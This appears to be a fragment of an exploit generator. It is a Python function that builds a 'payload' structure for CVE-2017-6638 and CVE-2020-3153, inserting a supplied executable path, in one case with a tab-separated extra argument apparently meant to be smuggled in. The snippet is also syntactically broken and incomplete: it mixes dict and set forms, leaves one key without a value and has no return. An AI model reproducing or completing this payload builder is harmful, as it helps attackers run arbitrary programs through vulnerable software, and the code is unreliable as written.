"""
def generate(exe_path: str) -> bytes:
    payload = {
        'CVE-2017-6638': [
            [0, 2, f'"{exe_path}\t-"'],
            [0, 6, f'{exe_path}'],
        ],
        'CVE-2020-3153'
    }
"""